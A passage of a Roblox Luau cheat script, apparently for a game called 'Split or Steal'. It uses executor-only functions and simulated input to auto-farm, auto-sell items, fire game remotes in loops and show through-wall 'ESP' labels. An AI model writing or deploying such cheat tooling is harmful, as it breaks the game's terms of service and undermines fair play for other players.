                    local content = itemFrame:FindFirstChild("Content")
                    if content then
                        local nameLabel = content:FindFirstChild("Name")
                        local rarityLabel = content:FindFirstChild("Rarity")
                        if nameLabel and rarityLabel then
                            local itemRarity = rarityLabel.Text
                            if selectedRarities[itemRarity] then
                                local itemValueStr = nameLabel.Text
                                local parsedValue = parseUITextValue(itemValueStr)
                                if sellThreshold > 0 and parsedValue <= sellThreshold then
                                    local itemId = itemFrame.Name 
                                    uiItemIds[itemId] = true
                                    if not sellQueue[itemId] then
                                        debugLog("QUEUED -> ID: " .. tostring(itemId))
                                        sellQueue[itemId] = true
                                    end
                                end
                            end
                        end
                    end
                end
            end

            for qId in pairs(sellQueue) do
                if not uiItemIds[qId] then
                    sellQueue[qId] = nil
                end
            end
        end)
        isScanning = false
    end

    local function fullRefreshCycle()
        clickUnequipAll()
        task.wait(0.3)
        scanUIForItems()
        if next(sellQueue) ~= nil then
            processSellQueue()
        end
    end

    if invRemote then
        registerConnection(invRemote.OnClientEvent:Connect(function()
            if not autoSellEnabled then return end
            task.wait(0.2)
            fullRefreshCycle()
        end))
    end

    registerThread(function()
        while task.wait(5) do
            if not autoSellEnabled then continue end
            if isSelling and (tick() - lastSellActivity > 15) then
                debugLog("Selling appears stuck, resetting queue")
                sellQueue = {}
                isSelling = false
                lastSellActivity = tick()
            end
            fullRefreshCycle()
        end
    end)
end)

-- === CPU/FPS BOOST (NO LAG SPIKES) ===
local fpsBoostActive = false
local fpsConnections = {}

local function applyFpsBoostToObject(obj)
    pcall(function()
        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
            if obj.Material ~= Enum.Material.SmoothPlastic then
                obj.Material = Enum.Material.SmoothPlastic
                obj.Reflectance = 0
                obj.CastShadow = false
            end
        elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Sparkles") or obj:IsA("Smoke") or obj:IsA("Fire") then
            obj:Destroy()
        elseif obj:IsA("PostEffect") or obj:IsA("BlurEffect") or obj:IsA("SunRaysEffect") or obj:IsA("ColorCorrectionEffect") or obj:IsA("BloomEffect") or obj:IsA("DepthOfFieldEffect") then
            obj.Enabled = false
        end
    end)
end

local function initialFpsBoost()
    pcall(function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        local Lighting = game:GetService("Lighting")
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        
        for _, v in pairs(Lighting:GetDescendants()) do
            applyFpsBoostToObject(v)
        end

        local Terrain = workspace:FindFirstChildOfClass("Terrain")
        if Terrain then
            Terrain.WaterWaveSize = 0
            Terrain.WaterWaveSpeed = 0
            Terrain.WaterReflectance = 0
        end

        for _, v in pairs(workspace:GetDescendants()) do
            applyFpsBoostToObject(v)
        end
    end)
end

local function toggleContinuousFPSBoost(state)
    fpsBoostActive = state
    if state then
        initialFpsBoost()
        local conn1 = workspace.DescendantAdded:Connect(function(obj)
            applyFpsBoostToObject(obj)
        end)
        local conn2 = game:GetService("Lighting").DescendantAdded:Connect(function(obj)
            applyFpsBoostToObject(obj)
        end)
        table.insert(fpsConnections, conn1)
        table.insert(fpsConnections, conn2)
    else
        for _, conn in ipairs(fpsConnections) do
            pcall(function() conn:Disconnect() end)
        end
        fpsConnections = {}
    end
end

-- === CONFIGURATION LOGIC & TOGGLES ===
local selectedPlayTable = "Table2"
local activeToggles = {}
local toggleFunctions = {}

local espObjects = {}
local function toggleTableESP(state)
    if state then
        for i = 1, 12 do
            local tableName = "Table" .. i
            local tableModel = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Tables") and workspace.Map.Tables:FindFirstChild(tableName)
            
            if tableModel then
                local targetPart = tableModel:IsA("Model") and tableModel.PrimaryPart or tableModel:FindFirstChildWhichIsA("BasePart") or tableModel
                if targetPart and targetPart:IsA("BasePart") then
                    local bgui = Instance.new("BillboardGui")
                    bgui.Name = "ESP_" .. tableName
                    bgui.AlwaysOnTop = true
                    bgui.Size = UDim2.new(0, 50, 0, 50)
                    bgui.StudsOffset = Vector3.new(0, 6, 0)
            
                    local txt = Instance.new("TextLabel")
                    txt.Size = UDim2.new(1, 0, 1, 0)
                    txt.BackgroundTransparency = 1
                    txt.Text = tostring(i)
                    txt.TextColor3 = Color3.fromRGB(0, 255, 150)
                    txt.Font = Enum.Font.GothamBlack
                    txt.TextScaled = true
                    txt.TextStrokeTransparency = 0
                    txt.Parent = bgui
                    bgui.Parent = targetPart
                    table.insert(espObjects, bgui)
                end
            end
        end
    else
        for _, bgui in ipairs(espObjects) do
            if bgui and bgui.Parent then bgui:Destroy() end
        end
        espObjects = {}
    end
end

local actionsConfig = {
    { Tab = AutoFarmContainer, Name = "Auto Split", Delay = 0.1, Action = function() RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Tables"):WaitForChild("DecisionRequest"):FireServer("Split") end },
    { Tab = AutoFarmContainer, Name = "Play Again", Delay = 1.3, IsPlayAgain = true, Action = function() RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("PlayAgainRequest"):FireServer(selectedPlayTable) end },
    { Tab = AutoFarmContainer, Name = "Auto Jump", Delay = 4, Action = function() VIM:SendKeyEvent(true, Enum.KeyCode.Space, false, game); task.wait(0.05); VIM:SendKeyEvent(false, Enum.KeyCode.Space, false, game) end },
    { Tab = AutoFarmContainer, Name = "Sell Celestial", Delay = 5, RequiresConfirm = true, Action = function() RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("QuickSellRarity"):FireServer("Celestial") end },
    { Tab = AutoFarmContainer, Name = "Sell Divine", Delay = 5, RequiresConfirm = true, Action = function() RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("QuickSellRarity"):FireServer("Divine") end },
    { Tab = AutoFarmContainer, Name = "Auto Collect", Delay = 5400, Action = function() RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("CollectAll"):FireServer() end },
    { Tab = AutoFarmContainer, Name = "Auto Trait", IsBurst = true, Action = function() 
        local merchantEvent = RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("MerchantBuy")
        merchantEvent:FireServer("250KSlot")
        merchantEvent:FireServer("50MSlot")
        merchantEvent:FireServer("10BSlot")
        merchantEvent:FireServer("50MSlot")
    end },
    
    { Tab = MiscTogglesFrame, Name = "Table ESP", IsToggleCustom = true, Action = toggleTableESP },
    { Tab = MiscTogglesFrame, Name = "Auto FPS Boost", IsToggleCustom = true, Action = toggleContinuousFPSBoost } 
}

-- ============================================================
-- === AUTO COUNTRY SELECT (MOBILE OFFSET + SINGLE CONFIRM) ====
-- ============================================================

local countryOptions = {"USA", "Belgium", "Portugal", "England", "Brazil", "Argentina", "Spain", "France"}

local autoCountryEnabled = false
local selectedCountry = "USA"
local alreadySelectedThisEvent = false

local autoCountryBtn = Instance.new("TextButton")
autoCountryBtn.Size = UDim2.new(0, 143, 0, 34)
autoCountryBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
autoCountryBtn.Text = "Auto Country: OFF"
autoCountryBtn.TextColor3 = Color3.fromRGB(150, 150, 160)
autoCountryBtn.Font = Enum.Font.GothamSemibold
autoCountryBtn.TextSize = 11
autoCountryBtn.LayoutOrder = 1000
autoCountryBtn.Parent = AutoFarmContainer

Instance.new("UICorner", autoCountryBtn).CornerRadius = UDim.new(0, 6)
local autoBtnStroke = Instance.new("UIStroke", autoCountryBtn)
autoBtnStroke.Color = Color3.fromRGB(50, 50, 60)

local countryPickerBtn = Instance.new("TextButton")
countryPickerBtn.Size = UDim2.new(0, 38, 1, -10)
countryPickerBtn.Position = UDim2.new(1, -43, 0, 5)
countryPickerBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
countryPickerBtn.Text = selectedCountry:sub(1,3)
countryPickerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
countryPickerBtn.Font = Enum.Font.GothamBold
countryPickerBtn.TextSize = 11
countryPickerBtn.ZIndex = 5
countryPickerBtn.Parent = autoCountryBtn
Instance.new("UICorner", countryPickerBtn).CornerRadius = UDim.new(0, 4)

local countryListFrame = Instance.new("ScrollingFrame")
countryListFrame.Size = UDim2.new(0, 60, 0, 120)
countryListFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
countryListFrame.BorderSizePixel = 0
countryListFrame.ScrollBarThickness = 2
countryListFrame.ZIndex = 50
countryListFrame.Visible = false
countryListFrame.Parent = MainFrame

local countryListLayout = Instance.new("UIListLayout", countryListFrame)
countryListLayout.SortOrder = Enum.SortOrder.LayoutOrder

for _, country in ipairs(countryOptions) do
    local opt = Instance.new("TextButton", countryListFrame)
    opt.Size = UDim2.new(1, 0, 0, 22)
    opt.BackgroundTransparency = 1
    opt.Text = country
    opt.TextColor3 = Color3.fromRGB(200, 200, 200)
    opt.Font = Enum.Font.GothamSemibold
    opt.TextSize = 11
    opt.ZIndex = 51
    registerConnection(opt.MouseButton1Click:Connect(function()
        selectedCountry = country
        countryPickerBtn.Text = selectedCountry:sub(1,3)
        countryListFrame.Visible = false
    end))
end

registerConnection(countryPickerBtn.MouseButton1Click:Connect(function()
    countryListFrame.Visible = not countryListFrame.Visible
    if countryListFrame.Visible then
        local btnAbs = countryPickerBtn.AbsolutePosition
        local mainAbs = MainFrame.AbsolutePosition
        countryListFrame.Position = UDim2.new(0, btnAbs.X - mainAbs.X - 10, 0, btnAbs.Y - mainAbs.Y + countryPickerBtn.AbsoluteSize.Y + 2)
    end
end))

local function getCountryScriptEnv()
    local selectGui = LocalPlayer.PlayerGui:FindFirstChild("SelectCountry")
    if not selectGui then return nil end
    local scriptObj = selectGui:FindFirstChildWhichIsA("LocalScript")
    if not scriptObj then return nil end

    local env
    pcall(function() env = getsenv(scriptObj) end)
    if not env then
        pcall(function() env = getfenv(scriptObj) end)
    end
    return env
end

local function safeOpenGUI()
    local env = getCountryScriptEnv()
    if env and env.openScreen then
        pcall(env.openScreen)
        debugLog("Called env.openScreen()")
    else
        local selectGui = LocalPlayer.PlayerGui:FindFirstChild("SelectCountry")
        if selectGui then
            selectGui.Enabled = true
            local countryFrame = selectGui:FindFirstChild("Country")
            if countryFrame then
                countryFrame.Visible = true
                local main = countryFrame:FindFirstChild("Main")
                if main then
                    local uiScale = main:FindFirstChildWhichIsA("UIScale")
                    if uiScale then uiScale.Scale = 1 end
                end
            end
        end
        if _G.OpenBlur then pcall(_G.OpenBlur) end
        debugLog("Manual GUI open")
    end
end

local function safeCloseGUI()
    local env = getCountryScriptEnv()
    if env and env.closeScreen then
        pcall(env.closeScreen)
    else
        local countryFrame = LocalPlayer.PlayerGui:FindFirstChild("SelectCountry") and LocalPlayer.PlayerGui.SelectCountry:FindFirstChild("Country")
        if countryFrame then
            countryFrame.Visible = false
        end
        if _G.ForceCloseBlur then pcall(_G.ForceCloseBlur) end
    end
    debugLog("GUI closed")
end

local function clickCountryInGUI()
    local selectGui = LocalPlayer.PlayerGui:FindFirstChild("SelectCountry")
    if not selectGui then return false end
    local countryFrame = selectGui:FindFirstChild("Country")
    if not countryFrame or not countryFrame.Visible then return false end
    local content = countryFrame.Main and countryFrame.Main:FindFirstChild("Content")
    if not content then return false end
    local mainHolder = content:FindFirstChild("MainHolder")
    local confirmButton = content:FindFirstChild("ButtonsHolder") and content.ButtonsHolder:FindFirstChild("Confirm")
    if not (mainHolder and confirmButton) then return false end

    local countryButton = mainHolder:FindFirstChild(selectedCountry)
    if not countryButton then return false end

    local clickTarget = countryButton:FindFirstChild("DefaultSlot1")
    if not clickTarget or not clickTarget:IsA("GuiButton") then return false end

    local topOffset = 0
    pcall(function()
        topOffset = game:GetService("GuiService"):GetGuiInset().Y
    end)
    debugLog("Top bar offset: " .. tostring(topOffset))

    local extraOffsetX = 0
    if UIS.TouchEnabled then
        extraOffsetX = 15
    end

    local x = clickTarget.AbsolutePosition.X + (clickTarget.AbsoluteSize.X / 2) + extraOffsetX
    local y = clickTarget.AbsolutePosition.Y + (clickTarget.AbsoluteSize.Y / 2) + topOffset
    debugLog("Clicking country: " .. selectedCountry .. " at " .. x .. ", " .. y)
    VIM:SendMouseButtonEvent(x, y, 0, true, game, 1)
    task.wait(0.05)
    VIM:SendMouseButtonEvent(x, y, 0, false, game, 1)
    debugLog("Country clicked")

    task.wait(0.5)

    if confirmButton and confirmButton.AbsolutePosition then
        local cx = confirmButton.AbsolutePosition.X + (confirmButton.AbsoluteSize.X / 2)
        local cy = confirmButton.AbsolutePosition.Y + (confirmButton.AbsoluteSize.Y / 2) + topOffset
        debugLog("Clicking Confirm at " .. cx .. ", " .. cy)
        VIM:SendMouseButtonEvent(cx, cy, 0, true, game, 1)
        task.wait(0.05)
        VIM:SendMouseButtonEvent(cx, cy, 0, false, game, 1)
        debugLog("Confirm clicked")
    else
        return false
    end
    return true
end

local function performFullSelection()
    safeOpenGUI()
    task.wait(0.5)
    local ok = clickCountryInGUI()
    if ok then
        task.wait(0.5)
        safeCloseGUI()
    end
    return ok
end

local function setAutoCountryEnabled(state)
    if autoCountryEnabled == state then return end
    autoCountryEnabled = state
    if state then
        autoCountryBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 110)
        autoCountryBtn.TextColor3 = Color3.fromRGB(20, 35, 20)
        autoCountryBtn.Text = "Auto Country: ON"
        autoBtnStroke.Color = Color3.fromRGB(0, 200, 110)

        registerThread(function()
            while autoCountryEnabled do
                if alreadySelectedThisEvent then
                    task.wait(5)
                    continue
                end

                local activeWeather = RS:FindFirstChild("ActiveWeather")
                if activeWeather and activeWeather.Value == "WorldCup" then
                    debugLog("WorldCup active, starting auto selection...")
                    local success = pcall(performFullSelection)
                    if success then
                        alreadySelectedThisEvent = true
                        debugLog("Auto selection completed successfully")
                    else
                        debugLog("Auto selection FAILED")
                    end
                end
                task.wait(5)
            end
        end)
    else
        autoCountryBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
        autoCountryBtn.TextColor3 = Color3.fromRGB(150, 150, 160)
        autoCountryBtn.Text = "Auto Country: OFF"
        autoBtnStroke.Color = Color3.fromRGB(50, 50, 60)
    end
end

local function onWeatherChanged(newWeather)
    if newWeather ~= "WorldCup" then
        alreadySelectedThisEvent = false
        debugLog("World Cup ended – flag reset")
    end
end
local weatherEvent = RS:WaitForChild("WeatherChanged", 10)
if weatherEvent then
    registerConnection(weatherEvent.OnClientEvent:Connect(onWeatherChanged))
end

local testCountryBtn = Instance.new("TextButton")
testCountryBtn.Size = UDim2.new(0, 143, 0, 34)
testCountryBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
testCountryBtn.Text = "Test Country Now"
testCountryBtn.TextColor3 = Color3.fromRGB(255, 200, 0)
testCountryBtn.Font = Enum.Font.GothamBold
testCountryBtn.TextSize = 12
testCountryBtn.LayoutOrder = 1001
testCountryBtn.Parent = AutoFarmContainer
Instance.new("UICorner", testCountryBtn).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", testCountryBtn).Color = Color3.fromRGB(50, 50, 60)

registerConnection(testCountryBtn.MouseButton1Click:Connect(function()
    debugLog("Test button pressed")
    performFullSelection()
end))

registerConnection(autoCountryBtn.MouseButton1Click:Connect(function()
    setAutoCountryEnabled(not autoCountryEnabled)
end))

-- ============================================================
-- === AUTO CHAIR EQUIP (WORLD CUP ↔ NORMAL) WITH DROPDOWN ===
-- ============================================================

local autoChairEnabled = false
local selectedNormalChair = "Infernal Gamer Chair"
local normalChairOptions = {"Infernal Gamer Chair", "Fused Samurai Chair", "Samurai Chair"}

local autoChairBtn = Instance.new("TextButton")
autoChairBtn.Size = UDim2.new(0, 143, 0, 34)
autoChairBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
autoChairBtn.Text = "Auto Chair: OFF"
autoChairBtn.TextColor3 = Color3.fromRGB(150, 150, 160)
autoChairBtn.Font = Enum.Font.GothamSemibold
autoChairBtn.TextSize = 11
autoChairBtn.LayoutOrder = 1002
autoChairBtn.Parent = AutoFarmContainer

Instance.new("UICorner", autoChairBtn).CornerRadius = UDim.new(0, 6)
local autoChairStroke = Instance.new("UIStroke", autoChairBtn)
autoChairStroke.Color = Color3.fromRGB(50, 50, 60)

local chairPickerBtn = Instance.new("TextButton")
chairPickerBtn.Size = UDim2.new(0, 38, 1, -10)
chairPickerBtn.Position = UDim2.new(1, -43, 0, 5)
chairPickerBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
chairPickerBtn.Text = "Infernal"
chairPickerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
chairPickerBtn.Font = Enum.Font.GothamBold
chairPickerBtn.TextSize = 11
chairPickerBtn.ZIndex = 5
chairPickerBtn.Parent = autoChairBtn
Instance.new("UICorner", chairPickerBtn).CornerRadius = UDim.new(0, 4)

local chairListFrame = Instance.new("ScrollingFrame")
chairListFrame.Size = UDim2.new(0, 100, 0, 80)
chairListFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
chairListFrame.BorderSizePixel = 0
chairListFrame.ScrollBarThickness = 2
chairListFrame.ZIndex = 50
chairListFrame.Visible = false
chairListFrame.Parent = MainFrame

local chairListLayout = Instance.new("UIListLayout", chairListFrame)
chairListLayout.SortOrder = Enum.SortOrder.LayoutOrder

for _, chairName in ipairs(normalChairOptions) do
    local opt = Instance.new("TextButton", chairListFrame)
    opt.Size = UDim2.new(1, 0, 0, 22)
    opt.BackgroundTransparency = 1
    opt.Text = chairName
    opt.TextColor3 = Color3.fromRGB(200, 200, 200)
    opt.Font = Enum.Font.GothamSemibold
    opt.TextSize = 11
    opt.ZIndex = 51
    registerConnection(opt.MouseButton1Click:Connect(function()
        selectedNormalChair = chairName
        chairPickerBtn.Text = chairName:match("^(%a+)") or chairName:sub(1,8)
        chairListFrame.Visible = false
    end))
end

registerConnection(chairPickerBtn.MouseButton1Click:Connect(function()
    chairListFrame.Visible = not chairListFrame.Visible
    if chairListFrame.Visible then
        local btnAbs = chairPickerBtn.AbsolutePosition
        local mainAbs = MainFrame.AbsolutePosition
        chairListFrame.Position = UDim2.new(0, btnAbs.X - mainAbs.X - 30, 0, btnAbs.Y - mainAbs.Y + chairPickerBtn.AbsoluteSize.Y + 2)
    end
end))

chairPickerBtn.Text = selectedNormalChair:match("^(%a+)") or selectedNormalChair:sub(1,8)

local function setAutoChairEnabled(state)
    if autoChairEnabled == state then return end
    autoChairEnabled = state
    if state then
        autoChairBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 110)
        autoChairBtn.TextColor3 = Color3.fromRGB(20, 35, 20)
        autoChairBtn.Text = "Auto Chair: ON"
        autoChairStroke.Color = Color3.fromRGB(0, 200, 110)

        registerThread(function()
            while autoChairEnabled do
                local activeWeather = RS:FindFirstChild("ActiveWeather")
                local isWorldCup = activeWeather and activeWeather.Value == "WorldCup"

                local chairToEquip = isWorldCup and "Gold Trophy Chair" or selectedNormalChair
                pcall(function()
                    RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("EquipChair"):FireServer(chairToEquip)
                    debugLog("Equipped chair: " .. chairToEquip)
                end)
                task.wait(5)
            end
        end)
    else
        autoChairBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
        autoChairBtn.TextColor3 = Color3.fromRGB(150, 150, 160)
        autoChairBtn.Text = "Auto Chair: OFF"
        autoChairStroke.Color = Color3.fromRGB(50, 50, 60)
    end
end

registerConnection(autoChairBtn.MouseButton1Click:Connect(function()
    setAutoChairEnabled(not autoChairEnabled)
end))

-- ============================================================
-- END AUTO CHAIR WITH DROPDOWN
-- ============================================================

for _, config in ipairs(actionsConfig) do
    local btn = Instance.new("TextButton")
    btn.Font = Enum.Font.GothamSemibold
    btn.TextSize = 12
    btn.Parent = config.Tab
    
    local btnCorner = Instance.new("UICorner", btn)
    btnCorner.CornerRadius = UDim.new(0, 6)

    local offColor = Color3.fromRGB(30, 30, 35)
    local onColor = Color3.fromRGB(0, 200, 110)
    local offTextColor = Color3.fromRGB(150, 150, 160)
    local onTextColor = Color3.fromRGB(20, 35, 20)
    
    local btnStroke = Instance.new("UIStroke")
    btnStroke.Color = Color3.fromRGB(50, 50, 60)
    btnStroke.Thickness = 1
    btnStroke.Parent = btn

    btn.BackgroundColor3 = offColor
    btn.Text = config.Name
    btn.TextColor3 = offTextColor

    if config.IsToggleCustom then
        local state = false
        local function executeCustomToggle(forceState)
            if forceState ~= nil then
                if state == forceState then return end
                state = forceState
            else
                state = not state
            end
            activeToggles[config.Name] = state
            btn.BackgroundColor3 = state and onColor or offColor
            btn.TextColor3 = state and onTextColor or offTextColor
            btnStroke.Color = state and onColor or Color3.fromRGB(50, 50, 60)
            pcall(function() config.Action(state) end)
        end
        toggleFunctions[config.Name] = executeCustomToggle
        registerConnection(btn.MouseButton1Click:Connect(function() executeCustomToggle() end))
        continue
    end

    if config.IsPlayAgain then
        local dropBtn = Instance.new("TextButton")
        dropBtn.Size = UDim2.new(0, 30, 1, -10)
        dropBtn.Position = UDim2.new(1, -35, 0, 5)
        dropBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
        dropBtn.Text = "T2"
        dropBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        dropBtn.Font = Enum.Font.GothamBold
        dropBtn.TextSize = 11
        dropBtn.ZIndex = 5
        Instance.new("UICorner", dropBtn).CornerRadius = UDim.new(0, 4)
        dropBtn.Parent = btn
       
        local listFrame = Instance.new("ScrollingFrame")
        listFrame.Size = UDim2.new(0, 45, 0, 110)
        listFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
        listFrame.BorderSizePixel = 0
        listFrame.ScrollBarThickness = 2
        listFrame.ZIndex = 50
        listFrame.Visible = false
        listFrame.Parent = MainFrame 
        
        local listLayout = Instance.new("UIListLayout", listFrame)
        listLayout.SortOrder = Enum.SortOrder.LayoutOrder
        
        for i = 1, 12 do
            local opt = Instance.new("TextButton")
            opt.Size = UDim2.new(1, 0, 0, 22)
            opt.BackgroundTransparency = 1
            opt.Text = tostring(i)
            opt.TextColor3 = Color3.fromRGB(200, 200, 200)
            opt.Font = Enum.Font.GothamSemibold
            opt.TextSize = 11
            opt.ZIndex = 51
            opt.Parent = listFrame
            
            registerConnection(opt.MouseButton1Click:Connect(function()
                selectedPlayTable = "Table" .. i
                dropBtn.Text = "T" .. i
                listFrame.Visible = false
            end))
        end
        
        registerConnection(dropBtn.MouseButton1Click:Connect(function()
            listFrame.Visible = not listFrame.Visible
            if listFrame.Visible then
                local absPos = dropBtn.AbsolutePosition
                local mainPos = MainFrame.AbsolutePosition
                listFrame.Position = UDim2.new(0, (absPos.X - mainPos.X) - 5, 0, (absPos.Y - mainPos.Y) + dropBtn.AbsoluteSize.Y + 2)
            end
        end))
    end

    local looping = false
    local activeThread = nil 

    local function executeToggleCode(forceState)
        if forceState ~= nil then
            if looping == forceState then return end
            looping = forceState
        else
            looping = not looping
        end
        
        activeToggles[config.Name] = looping

        if looping then
            btn.BackgroundColor3 = onColor
            btn.TextColor3 = onTextColor
            btnStroke.Color = onColor 
            
            activeThread = registerThread(function()
                while looping do
                    if config.IsBurst then
                        for burstCount = 1, 5 do
                            pcall(config.Action)
                            task.wait(0.05) 
                        end
                        for waitTick = 1, 1200 do task.wait(0.1) end
                    else
                        pcall(config.Action)
                        local ticksToWait = math.floor(config.Delay * 10)
                        for waitTick = 1, ticksToWait do task.wait(0.1) end
                    end
                end
            end)
        else
            btn.BackgroundColor3 = offColor
            btn.TextColor3 = offTextColor
            btnStroke.Color = Color3.fromRGB(50, 50, 60)
           
            if activeThread then
                task.cancel(activeThread)
                activeThread = nil
            end
        end
    end

    toggleFunctions[config.Name] = executeToggleCode

    registerConnection(btn.MouseButton1Click:Connect(function()
        if config.RequiresConfirm and not looping then
            ShowPopup("Are you sure? This will sell ALL your " .. config.Name:gsub("Sell ", "") .. "s!", function(confirmed)
                if confirmed then executeToggleCode() end
            end)
        else
            executeToggleCode()
        end
    end))
end

-- === ULTIMATE CONFIG SAVING/LOADING SYSTEM ===
local CONFIG_FOLDER = "SplitOrStealConfigs"

local ConfigSection = Instance.new("Frame", MiscContainer)
ConfigSection.Size = UDim2.new(1, 0, 0, 0)
ConfigSection.BackgroundTransparency = 1
ConfigSection.AutomaticSize = Enum.AutomaticSize.Y
ConfigSection.LayoutOrder = 3

local ConfigLayout = Instance.new("UIListLayout", ConfigSection)
ConfigLayout.SortOrder = Enum.SortOrder.LayoutOrder
ConfigLayout.Padding = UDim.new(0, 8)

local ConfigTitle = Instance.new("TextLabel", ConfigSection)
ConfigTitle.Size = UDim2.new(1, 0, 0, 20)
ConfigTitle.BackgroundTransparency = 1
ConfigTitle.Text = "CONFIG HUB"
ConfigTitle.TextColor3 = Color3.fromRGB(180, 180, 200)
ConfigTitle.Font = Enum.Font.GothamBold
ConfigTitle.TextSize = 12
ConfigTitle.TextXAlignment = Enum.TextXAlignment.Left

local SearchBoxContainer = Instance.new("Frame", ConfigSection)
SearchBoxContainer.Size = UDim2.new(1, -10, 0, 34)
SearchBoxContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
Instance.new("UICorner", SearchBoxContainer).CornerRadius = UDim.new(0, 6)
local SearchStroke = Instance.new("UIStroke", SearchBoxContainer)
SearchStroke.Color = Color3.fromRGB(50, 50, 60)

local SearchIcon = Instance.new("TextLabel", SearchBoxContainer)
SearchIcon.Size = UDim2.new(0, 30, 1, 0)
SearchIcon.BackgroundTransparency = 1
SearchIcon.Text = "🔍"
SearchIcon.TextColor3 = Color3.fromRGB(150, 150, 160)
SearchIcon.TextSize = 14

local ConfigNameBox = Instance.new("TextBox", SearchBoxContainer)
ConfigNameBox.Size = UDim2.new(1, -40, 1, 0)
ConfigNameBox.Position = UDim2.new(0, 30, 0, 0)
ConfigNameBox.BackgroundTransparency = 1
ConfigNameBox.Text = ""
ConfigNameBox.PlaceholderText = "Search or type new config name..."
ConfigNameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ConfigNameBox.Font = Enum.Font.GothamSemibold
ConfigNameBox.TextSize = 12
ConfigNameBox.TextXAlignment = Enum.TextXAlignment.Left

local ListContainer = Instance.new("Frame", ConfigSection)
ListContainer.Size = UDim2.new(1, -10, 0, 80)
ListContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
ListContainer.ClipsDescendants = true
Instance.new("UICorner", ListContainer).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", ListContainer).Color = Color3.fromRGB(50, 50, 60)

local ListScroll = Instance.new("ScrollingFrame", ListContainer)
ListScroll.Size = UDim2.new(1, 0, 1, 0)
ListScroll.BackgroundTransparency = 1
ListScroll.BorderSizePixel = 0
ListScroll.ScrollBarThickness = 3
ListScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
ListScroll.CanvasSize = UDim2.new(0, 0, 0, 0)

local ListLayout = Instance.new("UIListLayout", ListScroll)
ListLayout.SortOrder = Enum.SortOrder.LayoutOrder

local configListItems = {}

local function refreshConfigList(filterText)
    for _, item in ipairs(configListItems) do item:Destroy() end
    configListItems = {}
    
    if not listfiles then return end
    
    pcall(function()
        if not isfolder(CONFIG_FOLDER) then makefolder(CONFIG_FOLDER) end
        local files = listfiles(CONFIG_FOLDER)
        
        for _, path in ipairs(files) do
            local fileName = string.match(path, "[^\\/]+$")
            if fileName and fileName:match("%.json$") then
                local cleanName = fileName:gsub("%.json$", "")
                
                if not filterText or filterText == "" or string.lower(cleanName):match(string.lower(filterText)) then
                    local itemFrame = Instance.new("Frame", ListScroll)
                    itemFrame.Size = UDim2.new(1, 0, 0, 26)
                    itemFrame.BackgroundTransparency = 1
                    
                    local selectBtn = Instance.new("TextButton", itemFrame)
                    selectBtn.Size = UDim2.new(1, -30, 1, 0)
                    selectBtn.BackgroundTransparency = 1
                    selectBtn.Text = "  " .. cleanName
                    selectBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
                    selectBtn.Font = Enum.Font.GothamMedium
                    selectBtn.TextSize = 12
                    selectBtn.TextXAlignment = Enum.TextXAlignment.Left
                    
                    local delBtn = Instance.new("TextButton", itemFrame)
                    delBtn.Size = UDim2.new(0, 20, 0, 20)
                    delBtn.Position = UDim2.new(1, -25, 0, 3)
                    delBtn.BackgroundColor3 = Color3.fromRGB(255, 75, 75)
                    delBtn.Text = "X"
                    delBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    delBtn.Font = Enum.Font.GothamBold
                    delBtn.TextSize = 10
                    Instance.new("UICorner", delBtn).CornerRadius = UDim.new(0, 4)
                    
                    registerConnection(selectBtn.MouseButton1Click:Connect(function()
                        ConfigNameBox.Text = cleanName
                    end))
                    
                    registerConnection(delBtn.MouseButton1Click:Connect(function()
                        ShowPopup("Delete config '" .. cleanName .. "'?", function(confirmed)
                            if confirmed then
                                pcall(function() delfile(CONFIG_FOLDER .. "/" .. fileName) end)
                                refreshConfigList(ConfigNameBox.Text)
                            end
                        end)
                    end))
                    
                    registerConnection(selectBtn.MouseEnter:Connect(function() selectBtn.TextColor3 = Color3.fromRGB(0, 200, 110) end))
                    registerConnection(selectBtn.MouseLeave:Connect(function() selectBtn.TextColor3 = Color3.fromRGB(200, 200, 200) end))
                    
                    table.insert(configListItems, itemFrame)
                end
            end
        end
    end)
end

registerConnection(ConfigNameBox.Focused:Connect(function() SearchStroke.Color = Color3.fromRGB(0, 200, 110) end))
